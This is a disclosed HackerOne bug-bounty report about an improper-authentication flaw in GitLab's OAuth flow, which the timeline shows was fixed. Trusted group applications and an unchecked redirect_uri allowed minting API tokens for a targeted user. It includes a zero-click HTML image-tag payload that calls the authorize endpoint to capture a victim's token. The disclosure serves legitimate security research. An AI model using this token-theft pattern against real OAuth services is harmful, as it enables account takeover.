---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
date: 2025-07-23
submitted: 2021-04-04T11:00:27.707Z
bounty_usd: 5580
votes: 140
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "timothyleung"
source: "https://hackerone.com/reports/1148364"
title: "Mint Oauth2 access token for targeted user"
---
# Mint Oauth2 access token for targeted user

> **Severity:** High | **Bounty:** 5,580 USD | **Votes:** 140 | **Program:** GitLab | **Disclosed:** 2025-07-23

- Report: [https://hackerone.com/reports/1148364](https://hackerone.com/reports/1148364)
- CWE: Improper Authentication - Generic
- Submitted: 2021-04-04T11:00:27.707Z

## Timeline

- **Report Filed**
- **2021-04-04** @timothyleung: Recorded the exploitation process.
- **2021-04-04** @timothyleung: I believe a similar issue had been discussed here before - https://gitlab.com/gitlab-org/gitlab/-/issues/209087 

The first problem is that the group owner should not be able to make an application trusted by default. This seems to be a doorkeeper design but verification might need to be done before passing the request to doorkeeper. 

Another problem is that I was able to specify the `redirect_uri` to any domains, this was not verified because it is a special case when you hit the `login/oauth/authorize` endpoint. This endpoint is made for JIRA DVCS integration specifically. 
https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/oauth/jira/authorizations_controller.rb#L14 

Hope that helps.
- **2021-04-04** @timothyleung: The exploit can be triggered by a GET request. It means we can basically embed the payload in a more popular website that developer uses. No clicks are required :) 

```
<html>
<img src="https://gitlab.com/login/oauth/authorize?redirect_uri=http://localhost:4444/&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api">
</html>
```
- **2021-04-05** @timothyleung: I just had a look again and realize the JIRA part doesn't matter at all. I should hit the `/oauth/token` endpoint instead of `/login/oauth/access_token` endpoint. This will make the attack easier since the attacker has full control to the redirect_uri anyways. 

I have recorded the new attack scenario again, this will should be more straightforward. The only vulnerability here is that the group owner should not be able to make a group application trustable by default.
- **2021-04-05** @h1_analyst_everton: Hi @timothyleung,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@glassofbeer
- **2021-04-05** @h1_analyst_everton: Hi @timothyleung - I'm discussing this submission internally with the GitLab team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **2021-04-06** @timothyleung: Thanks! Do you mind reviewing the severity of the finding as well? I used the CVSS calculator which gives me critical but I am not a big fan of making things "critical" all the time and hence I just leave it as High. https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
- **2021-04-06** @rchan: Hi @timothyleung,

Yes, we will have a discussion about the CVSS of this finding soon, I'll let you know once we have a decision.

Thanks,
ROn
GitLab Security Team
- **2021-04-07** @rchan: Hi @timothyleung,

We've just pushed a fix on gitlab.com, can you please verify on your end and let us know?

Appreciate your help!

Thanks,
Ron
GitLab Security Team
- **2021-04-07** @timothyleung: Hi Ron, 
I have verified it and confirmed that I can no longer perform the attack. 

Tim
- **2021-04-14** @gitlab-securitybot: ETA for fix:

Hi @timothyleung,

The issue you reported is currently scheduled to be fixed by 2021-04-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **2021-04-20** @timothyleung: thanks for the  bounty! It was great to work with you :)
- **2021-04-21** @rchan: @timothyleung The feeling is mutual, keep up the good work!
- **Agreed On Going Public**
- **2021-05-22** @timothyleung: Happy to disclose this after the videos are removed.
- **2021-05-22** @dcouture: Done!
- **2021-07-12** @dcouture: Just a little ping if you're still willing to disclose the report!
- **Agreed On Going Public**
- **Report Became Public**
- **2025-07-23** @timothyleung: Can CVE be assigned? Thank you!
